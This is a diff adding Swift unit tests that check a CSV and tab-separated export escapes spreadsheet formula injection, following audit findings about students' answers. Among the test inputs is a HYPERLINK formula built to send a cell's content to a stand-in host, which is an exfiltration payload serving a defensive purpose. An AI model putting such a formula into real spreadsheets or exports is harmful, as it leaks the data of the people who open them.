@@ -115,3 +115,37 @@ struct P2JobHistoryLoadTests {
         #expect(JobHistory.batches(records).map(\.records.count) == [2, 2])
     }
 }
+
+// MARK: - KOM-14, ZAJ-02: exported cells are never formulas
+
+struct P2CSVFormulaTests {
+    /// AUDIT KOM-14, ZAJ-02: students' answers and app versions read from the student's Applications folder went
+    /// into the CSV as they were, so a value starting with "=" opened in Excel/Numbers as a formula.
+    @Test func cellsThatASpreadsheetWouldEvaluateAreNeutralised() {
+        #expect(CSV.escape("=1+1") == "'=1+1")
+        #expect(CSV.escape("+48 123") == "'+48 123")
+        #expect(CSV.escape("-1+2") == "'-1+2")
+        #expect(CSV.escape("@SUM(A1)") == "'@SUM(A1)")
+        #expect(CSV.escape("\t=1") == "'\t=1")
+        #expect(CSV.escape("\r=1") == "\"'\r=1\"")
+        let link = #"=HYPERLINK("https://example.com/?"&A2;"6.0")"#
+        #expect(CSV.escape(link) == #""'=HYPERLINK(""https://example.com/?""&A2;""6.0"")""#)
+        let file = CSV.render([["Komputer", "Odpowiedź"], ["imac01", "=1+1"]], bom: false)
+        #expect(file == "Komputer;Odpowiedź\r\nimac01;'=1+1\r\n")
+    }
+
+    @Test func plainTextAndNumbersStayAsTheyAre() {
+        #expect(CSV.escape("imac01") == "imac01")
+        #expect(CSV.escape("-5") == "-5")
+        #expect(CSV.escape("+3") == "+3")
+        #expect(CSV.escape("-1,5") == "-1,5")
+        #expect(CSV.escape("6.0 (1234)") == "6.0 (1234)")
+        #expect(CSV.escape("a=b") == "a=b")
+    }
+
+    /// „Kopiuj” puts tab-separated text on the clipboard, which a spreadsheet evaluates on paste as well.
+    @Test func copiedTableTextIsNeutralisedAndKeepsItsShape() {
+        let text = CSV.tsv([["imac01", "Ala", "=1+1"], ["imac02", "Ola", "dwie\nlinie\tz tabulatorem"]])
+        #expect(text == "imac01\tAla\t'=1+1\nimac02\tOla\tdwie linie z tabulatorem")
+    }
+}
